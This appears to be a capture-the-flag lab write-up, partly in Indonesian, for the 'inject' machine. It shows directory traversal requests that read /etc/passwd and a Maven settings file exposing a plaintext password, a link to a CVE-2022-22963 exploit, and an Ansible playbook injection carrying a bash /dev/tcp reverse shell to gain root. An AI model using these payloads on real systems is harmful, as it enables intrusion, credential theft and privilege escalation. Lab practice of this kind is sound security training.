
| Port | State | Service | Reason |
|---|---|---|---|
| 22 | open | ssh | syn-ack |
| 8080 | open | http-proxy | syn-ack |



| Field     | Description                                          |
|-----------|-------------------------------------------------------|
| Request   | `GET /show_image?img=../../../../../../../../etc/passwd` |
| Method    | GET                                                   |
| Host      | 10.10.11.204:8080                                       |
| User-Agent | Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0 |
| ...       | (Other headers omitted for brevity)                    |

**Vulnerability:** Directory Traversal

**Explanation:** The attacker attempts to manipulate the file path by using "../../" sequences to move up the directory hierarchy and potentially reach restricted files like `/etc/passwd`.

**Response (Simulated):**

```json
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 1986
Date: Tue, 18 Jun 2024 06:04:53 GMT
Keep-Alive: timeout=60
Connection: keep-alive

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false

```


###### exploitasi user

```json
GET /show_image?img=../../../../../../../../../../../../../home/frank/.m2/settings.xml HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.204:8080/upload
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1


```


**response**
```json
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 617
Date: Tue, 18 Jun 2024 06:13:55 GMT
Keep-Alive: timeout=60
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>

```


###### path WebApp

```json
GET /show_image?img=../../../../../../../../../var/www/WebApp/ HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.204:8080/upload
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1


```

**Response:**
```json
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 4096
Date: Tue, 18 Jun 2024 06:15:49 GMT
Keep-Alive: timeout=60
Connection: keep-alive

.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target

```

###### mendapatakan pom.xml


```json
GET /show_image?img=../../../../../../../../../var/www/WebApp/pom.xml HTTP/1.1
Host: 10.10.11.204:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.10.11.204:8080/upload
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=1


```

**response:**
```json
HTTP/1.1 200 
Accept-Ranges: bytes
Content-Type: image/jpeg
Content-Length: 2187
Date: Tue, 18 Jun 2024 06:17:04 GMT
Keep-Alive: timeout=60
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>

```

di sini kita melihat versi nya, dan terdapat kerentanan dengan CVE: **CVE-2022-22963**
untuk script nya [link](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit)

setelah mendapatkan shell nya kita login dengan username phil, dan untuk password nya kita tadi mendapatkan di **/home/frank/.m2/setting.xml**


```json 
su phil
password: DocPhillovestoInject123
```



#### ROOT


```bash
find /opt/ -type f


/opt/automation/tasks/playbook_1.yml
```

```bash 
cat /opt/automation/tasks/playbook_1.yml


- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

```


##### Process

```bash
2024/06/18 06:46:01 CMD: UID=0     PID=23142  | /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml 
```


###### membuat reverse shell nya

di lokasi /opt/automation/tasks nanti tunggu bebrapa menit atau menggunakan psy64 runnning nya

```bash
echo "- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/1234 0>&1'" >> root.yml
```

###### reverse shell nya

```bash
[aexon@aexon-mybookhype3 CVE-2022-22963_Reverse-Shell-Exploit]$ pwncat -l 1234

root@inject:/opt/automation/tasks# id
uid=0(root) gid=0(root) groups=0(root)
root@inject:/opt/automation/tasks# 

```

###### root flag

```bash
cat /root/root.txt
61c223969059fb8e5f8f6a3171307b12
root@inject:/opt/automation/tasks# 
```